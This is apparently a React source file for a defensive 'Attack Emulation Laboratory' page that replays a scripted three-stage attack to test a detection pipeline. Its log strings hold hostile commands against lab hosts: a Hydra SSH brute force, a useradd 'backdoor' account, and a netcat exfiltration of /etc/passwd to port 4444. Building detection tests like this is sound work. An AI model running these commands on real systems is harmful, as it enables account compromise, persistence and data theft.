"use client";

import React, { useState } from "react";
import { 
  Flame, 
  Terminal, 
  Play, 
  ShieldAlert, 
  Key, 
  UserPlus, 
  Radio, 
  CheckCircle2, 
  ArrowRight,
  Server,
  Layers,
  Copy,
  Clock
} from "lucide-react";
import { triggerReplaySimulation } from "@/lib/api";

export default function AttacksPage() {
  const [isExecuting, setIsExecuting] = useState(false);
  const [activeAct, setActiveAct] = useState<number>(0);
  const [terminalLogs, setTerminalLogs] = useState<string[]>([
    "[INIT] Attack Emulation Laboratory Standby",
    "[LAB] Target Host: 192.168.56.10 (Ubuntu Server 24.04)",
    "[LAB] Attacker Sandbox: 192.168.56.20 (Hydra + Caldera Sandcat)",
    "[READY] Select an attack act below or launch full 3-act sequence."
  ]);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 4000);
  };

  const handleRunFullChain = async () => {
    setIsExecuting(true);
    setActiveAct(1);
    setTerminalLogs((prev) => [
      ...prev,
      "--------------------------------------------------",
      `[${new Date().toISOString()}] EXECUTION INITIATED: 3-Act Adversary Chain`,
      "[ACT 1] Launching T1110 Brute Force: hydra -l admin -P wordlist.txt ssh://192.168.56.10",
      "  >> sshd[4102]: Failed password for invalid user root from 192.168.56.20 port 49152",
      "  >> sshd[4105]: Failed password for admin from 192.168.56.20 port 49154",
      "  >> sshd[4120]: Accepted password for admin from 192.168.56.20 port 49164",
    ]);

    setTimeout(() => {
      setActiveAct(2);
      setTerminalLogs((prev) => [
        ...prev,
        "[ACT 2] Launching T1136 Account Creation: useradd -m -s /bin/bash backdoor",
        "  >> auditd: type=USER_ADD msg=audit: acct=\"backdoor\" exe=\"/usr/sbin/useradd\" res=success",
      ]);
    }, 1200);

    setTimeout(() => {
      setActiveAct(3);
      setTerminalLogs((prev) => [
        ...prev,
        "[ACT 3] Launching T1041 Exfiltration: nc -nv 192.168.56.20 4444 < /etc/passwd",
        "  >> ufw: [UFW BLOCK EGRESS] OUT=eth0 SRC=192.168.56.10 DST=192.168.56.20 PROTO=TCP DPT=4444",
        "[STATUS] 8 normalized events dispatched to FastAPI endpoint (POST /events).",
        "[VERIFICATION] NetworkX graph correlation created Incident #101.",
      ]);
      triggerReplaySimulation();
      setIsExecuting(false);
      showToast("Attack chain executed and transmitted to SOC daemon!");
    }, 2400);
  };

  return (
    <div className="mx-auto max-w-6xl px-6 py-12 sm:px-8 space-y-10">
      {toastMessage && (
        <div className="fixed bottom-6 right-6 z-50 flex items-center space-x-2.5 rounded-lg metallic-surface px-5 py-3 text-xs font-mono text-slate-200 border border-white/15 shadow-xl animate-in slide-in-from-bottom-3">
          <span className="h-1.5 w-1.5 rounded-full bg-slate-300 animate-pulse"></span>
          <span>{toastMessage}</span>
        </div>
      )}

      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between pb-8 hairline-b gap-4">
        <div>
          <div className="flex items-center space-x-2 text-xs font-mono text-slate-400">
            <span className="uppercase tracking-widest text-slate-300">ADVERSARY SIMULATION</span>
            <span>&bull;</span>
            <span>MITRE ATT&CK Matrix</span>
          </div>
          <h2 className="mt-3 text-3xl font-medium tracking-tight text-white">
            Attack Emulation Laboratory
          </h2>
          <p className="text-sm text-slate-400 mt-2 max-w-2xl leading-relaxed">
            Test and validate the Project X detection pipeline by launching the three acts of compromise against the victim VM.
          </p>
        </div>

        <button
          onClick={handleRunFullChain}
          disabled={isExecuting}
          className="btn-metallic-primary flex items-center space-x-2 rounded-lg px-5 py-3 text-xs font-semibold cursor-pointer disabled:opacity-50 shrink-0"
        >
          <Play className={`h-3.5 w-3.5 ${isExecuting ? "animate-spin" : ""}`} />
          <span>{isExecuting ? "Executing Sequence..." : "Run Full 3-Act Attack"}</span>
        </button>
      </div>

      {/* 3-Act Attack Cards Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        {/* Act 1 */}
        <div className={`metallic-card rounded-xl p-6 space-y-4 border transition-all ${
          activeAct === 1 ? "border-rose-500/40 shadow-lg" : "border-white/[0.08]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-slate-400">ACT 01 &bull; T1110</span>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono text-rose-300 bg-rose-500/10 border border-rose-500/20">
              BRUTE FORCE
            </span>
          </div>
          <h3 className="text-sm font-semibold text-white">
            SSH Credential Stuffing
          </h3>
          <p className="text-xs text-slate-400 leading-relaxed">
            Attacker on <code>192.168.56.20</code> executes Hydra brute-force against port 22 until an accepted login is recorded.
          </p>
          <div className="pt-2 text-[11px] font-mono text-slate-500">
            Triggers Rule: <strong>R1 (5 Fails + 1 Success)</strong>
          </div>
        </div>

        {/* Act 2 */}
        <div className={`metallic-card rounded-xl p-6 space-y-4 border transition-all ${
          activeAct === 2 ? "border-purple-500/40 shadow-lg" : "border-white/[0.08]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-slate-400">ACT 02 &bull; T1136</span>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono text-purple-300 bg-purple-500/10 border border-purple-500/20">
              PERSISTENCE
            </span>
          </div>
          <h3 className="text-sm font-semibold text-white">
            Backdoor Account Creation
          </h3>
          <p className="text-xs text-slate-400 leading-relaxed">
            Over the compromised session, the adversary spawns <code>useradd backdoor</code>, immediately intercepted by kernel <code>auditd</code>.
          </p>
          <div className="pt-2 text-[11px] font-mono text-slate-500">
            Triggers Rule: <strong>R2 (Useradd post-login)</strong>
          </div>
        </div>

        {/* Act 3 */}
        <div className={`metallic-card rounded-xl p-6 space-y-4 border transition-all ${
          activeAct === 3 ? "border-red-500/40 shadow-lg" : "border-white/[0.08]"
        }`}>
          <div className="flex items-center justify-between">
            <span className="text-[10px] font-mono font-bold text-slate-400">ACT 03 &bull; T1041</span>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono text-red-300 bg-red-500/10 border border-red-500/20">
              EXFILTRATION
            </span>
          </div>
          <h3 className="text-sm font-semibold text-white">
            C2 Channel Outbound Sync
          </h3>
          <p className="text-xs text-slate-400 leading-relaxed">
            Adversary attempts egress connection to external listening socket on port 4444, caught by <code>ufw</code> audit logging.
          </p>
          <div className="pt-2 text-[11px] font-mono text-slate-500">
            Triggers Rule: <strong>R3 (Outbound C2 Egress)</strong>
          </div>
        </div>
      </div>

      {/* Live Adversary Execution Terminal */}
      <div className="metallic-surface rounded-xl p-6 space-y-4">
        <div className="flex items-center justify-between pb-3 hairline-b">
          <div className="flex items-center space-x-2 text-xs font-mono text-slate-300">
            <Terminal className="h-4 w-4 text-slate-400" />
            <span>ADVERSARY EMULATION CONSOLE &bull; ATOMICTEST OUTPUT</span>
          </div>
          <span className="text-[11px] font-mono text-slate-500">TTY: /dev/pts/1</span>
        </div>

        <div className="preserve-dark rounded-lg bg-black/90 p-4 font-mono text-xs text-slate-300 h-64 overflow-y-auto space-y-1 border border-white/5">
          {terminalLogs.map((line, idx) => (
            <div key={idx} className="leading-relaxed">
              {line}
            </div>
          ))}
        </div>
      </div>

      {/* Caldera Profile Specification */}
      <div className="metallic-card rounded-xl p-6 space-y-4">
        <div className="text-[11px] font-mono text-slate-500 uppercase tracking-widest font-bold">
          MITRE CALDERA VERIFICATION INTEGRATION
        </div>
        <h3 className="text-sm font-medium text-white">
          Why the Same Attack Profile is Used Twice
        </h3>
        <p className="text-xs text-slate-400 leading-relaxed">
          The decisive verification proof relies on symmetry: Caldera re-triggers the exact ATT&CK profile (T1110) 
          originating from attacker IP <code>192.168.56.20</code> against victim port 22. If the block succeeded, the ability 
          fails to establish a TCP handshake &mdash; confirming mathematical isolation without guessing.
        </p>
      </div>
    </div>
  );
}
